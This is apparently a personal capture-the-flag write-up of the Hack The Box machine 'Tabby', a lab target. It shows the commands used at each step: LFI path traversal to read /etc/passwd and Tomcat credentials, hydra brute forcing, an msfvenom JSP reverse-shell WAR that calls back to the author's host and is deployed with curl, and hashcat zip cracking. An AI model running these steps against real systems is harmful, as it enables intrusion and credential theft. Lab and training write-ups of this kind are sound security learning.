After a quick enum we have the following:
```
PORT     STATE SERVICE    REASON
22/tcp   open  ssh        syn-ack ttl 63
80/tcp   open  http       syn-ack ttl 63
8080/tcp open  http-proxy syn-ack ttl 63
```
After digging a little bit through the HTTP server, we find a couple of things. First the domain `megahosting.com` an interesting endpoint that looks like takes a file as php argument:
http://megahosting.htb/news.php?file=statement

After trying some basic LFI, it looks like it only shows something in the web browser when the param is statement. It may be related to a statement.php file being opened and displayed maybe.

Let's do some web discovery and find out if we can get the statement.php file:
```
gobuster dir --url http://$(cat ip)/ --wordlist /home/lotape6/resources/hack/SecLists/Discovery/Web-Content/common.txt

===============================================================
/.htpasswd            (Status: 403) [Size: 277]
/.hta                 (Status: 403) [Size: 277]
/.htaccess            (Status: 403) [Size: 277]
/assets               (Status: 301) [Size: 313] [--> http://10.10.10.194/assets/]
/favicon.ico          (Status: 200) [Size: 766]
/files                (Status: 301) [Size: 312] [--> http://10.10.10.194/files/]
/index.php            (Status: 200) [Size: 14175]
/server-status        (Status: 403) [Size: 277]
```

Let's find out if we can reach the statement.php file through the files folder:
http://megahosting.htb/files/statement.php
Aaaaand nope. Let's continue searching:
```
gobuster dir --url http://$(cat ip)/ --wordlist /home/lotape6/resources/hack/SecLists/Discovery/Web-Content/Common-PHP-Filenames.txt
```

Wait for it, the files was statement, not statement.php!
http://megahosting.htb/files/statement does contain the content shown in http://megahosting.htb/news.php?file=statement.
Great new, we now need to find a way to upload a php file that can lead us to a reverse shell.

```
find $SECLIST -iname "*shell*"

# And we have a loots of shels to work with, I'll pick the php-reverse-shell-php as it looks fine
```

Let's keep investigating then! Le's take a look to http://megahosting.htb:8080/
Many interesting info there, it looks like we have some tomcat docs, we also have some interesting paths :
```
/etc/tomcat9/tomcat-users.xml
/var/lib/tomcat9/webapps/ROOT/index.html
```
We also have some interesting endpoints:
* http://megahosting.htb:8080/manager/html
* http://megahosting.htb:8080/host-manager/html

Let's try searching for some default credentials for tomcat9.

It looks like there is an interesting file in SecLists wuth tomcat stuff:
```
/home/lotape6/resources/hack/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt
```
So let's capture the request and try some dictionary attack!
Trying AAAA BBBB we get the next request:
```
GET /manager/html HTTP/1.1
Host: megahosting.htb:8080
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:132.0) Gecko/20100101 Firefox/132.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Authorization: Basic QUFBQTpCQkJC
```

If you decode `QUFBQTpCQkJC` in base64 you get `AAAA:BBBB`, so I will switch to the base64 wordlist then:
```
/home/lotape6/resources/hack/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist_base64encoded.txt
```

```
hydra -L users.txt -P /usr/share/seclists/Passwords/darkweb2017-top1000.txt -f 10.10.10.64 http-get /manager/html
```

After some research this looks to be the appropriate command:
```
hydra -C /home/lotape6/resources/hack/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt "http-get://$(cat ip):8080/manager/html:A=BASIC"
```

Neither this nor:
```
hydra -C /home/lotape6/resources/hack/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt "http-get://$(cat ip):8080/host-manager/html:A=BASIC"
```
Found anything. Let's try other wordlists as well. Let's split the default admin users:
```
cat /home/lotape6/resources/hack/SecLists/Passwords/Default-Credentials/tomcat-betterdefaultpasslist.txt | xargs -I % sh -c "echo % | cut -d: -f1 >> users"
```

It's running `Tomcat 9 (9.0.31)` so let's check if it's vulnerable, since hydra didn't work.

Let's get back to the news.php where we have a LFI that we can exploit to go further. First I've tried to exit the `file` folder and include `index.php` and it does work encoded in url, so let's try some LFI with fuzzing:
```
/home/lotape6/resources/hack/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt
```

And BOOM, some hits over there:
```
ffuf -u http://megahosting.htb/news.php\?file\=FUZZ -w /home/lotape6/resources/hack/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest.txt -fs 0


http://megahosting.htb/news.php?file=../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin bin:x:2:2:bin:/bin:/usr/sbin/nologin sys:x:3:3:sys:/dev:/usr/sbin/nologin sync:x:4:65534:sync:/bin:/bin/sync games:x:5:60:games:/usr/games:/usr/sbin/nologin man:x:6:12:man:/var/cache/man:/usr/sbin/nologin lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin mail:x:8:8:mail:/var/mail:/usr/sbin/nologin news:x:9:9:news:/var/spool/news:/usr/sbin/nologin uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin proxy:x:13:13:proxy:/bin:/usr/sbin/nologin www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin backup:x:34:34:backup:/var/backups:/usr/sbin/nologin list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin messagebus:x:103:106::/nonexistent:/usr/sbin/nologin syslog:x:104:110::/home/syslog:/usr/sbin/nologin _apt:x:105:65534::/nonexistent:/usr/sbin/nologin tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin pollinate:x:110:1::/var/cache/pollinate:/bin/false sshd:x:111:65534::/run/sshd:/usr/sbin/nologin systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false tomcat:x:997:997::/opt/tomcat:/bin/false mysql:x:112:120:MySQL Server,,,:/nonexistent:/bin/false ash:x:1000:1000:clive:/home/ash:/bin/bash
```

Then we can try accessing files from tomcat server by using the path shown in the index.html page:
http://megahosting.htb/news.php?file=../../../../var/lib/tomcat9/webapps/ROOT/index.html

And it works like a charm! Let's find out another interesting files to retrieve:
https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat/basic-tomcat-info

After realizing I'm stupid, I've searched the most stupid thing I should have done much earlier:
`tomcat-users.xml default path`
And it's: `CATALINA_HOME/conf/tomcat-users.xml`
Being `CATALINA_HOME` = `/usr/share/tomcat9`
SOOOOOOOOOOOOOOOOOOOOOOOOOOOO

`/usr/share/tomcat9/conf/tomcat-users.xml`

FUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUUCK
It is the last path in the whole index.html. I'm completely stupid:
`/etc/tomcat9/tomcat-users.xml`
Ah no it's not haha.


 /var/lib/tomcat9/bin/setenv.sh

Catalina home:

/home/tomcat/apache-tomcat-9.0.31
/home/ash/apache-tomcat-9.0.31

/home/tomcat/apache-tomcat-9.0.31/conf/tomcat-users.xml

../../../../usr/share/tomcat9/etc/tomcat-users.xml

Okay after sooo many time lost in searching and don't understanding why I was not seing the output is due to xml files not being displayed in the web browser :D

view-source:http://....

does de trick, or directly curl. So: view-source:megahosting.htb/news.php?file=../../../..../../../../usr/share/tomcat9/etc/tomcat-users.xml
Sooo:
Credentials:
`tomcat:$3cureP4s5w0rd123!`

After the mental breakdown, getting back to the tomcat's host-manager webpage, we can now try to upload a `.war` file to trigger a reverse shell, as mentioned in [hacktricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/tomcat)
```
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.6 LPORT=31415 -f war -o rev.war

curl --upload-file rev.war -u 'tomcat:$3cureP4s5w0rd123!' "http://$(cat ip):8080/manager/text/deploy?path=/rev"
```

Then we can directly go to http://megahosting.htb:8080/rev/ and we got our reverse shell.

We quickly find out that the system is on read-only mode, so we won't be able to execute `linepeas.sh`. Nevertheless, after some manual discovery, we find a zip file over `/var/www/html/files/`.

We can retrieve it via curl exploiting the same news.php webpage used before. We observe that the zip is protected with a password, and unluckily it's not the same as the user's pass.

Let's try to crack the zip file. First we are going to grab the hash with #john 
```
./zip2john /home/lotape6/resources/hack/htb/tracks/crest_crt/tabby/16162020_backup.zip > /home/lotape6/resources/hack/htb/tracks/crest_crt/tabby/zip.hash
```

Then, after upgrading hashcat (since my version was not able to attack my zip hash), it's time to identify the hash:
```
hashcat -h | grep -i zip

hashcat -m 17225 -a 0 zip.hash $SECLIST/../rockyou.txt
```

And the pass is: `admin@it`

And nothing really interesting over the zip file at a glance, but at least we have a new pass to try on different sites.

```
findall "*tomcat*" -type f | xargs -I % ffuf -u http://megahosting.htb:8080/host-manager/html/FUZZ -w % -fs 0 -b "JSESSIONID=5769658DF86D051715E712A309FD3DEC" -fc 401  -s


findall "*tomcat*" -type f | xargs -I % sh -c "ffuf -u http://megahosting.htb:8080/FUZZ -w % -fs 0 -b 'JSESSIONID=5769658DF86D051715E712A309FD3DEC'  -fc 401 -s >> tomcat_findings"

sort -u tomcat_findings > tomcat_findings_unique

```

After nothing interesting, let's try to perform some fuzzy search over the `/manager/` endpoint.
```
ffuf -u http://megahosting.htb:8080/manager/FUZZ -w /home/lotape6/resources/hack/fuzzdb/discovery/web-dir-list.txt -fs 0
________________________________________________

html                    [Status: 401, Size: 2499, Words: 457, Lines: 64, Duration: 131ms]
status                  [Status: 401, Size: 2499, Words: 457, Lines: 64, Duration: 135ms]
text                    [Status: 401, Size: 2499, Words: 457, Lines: 64, Duration: 153ms]

```

After doing the "canelo", I've tried once again to login with the pass of the zip into ash user, and it worked.

Let's linpeas a little bit then! And F\*ck yeah, we are in `lxd` group!

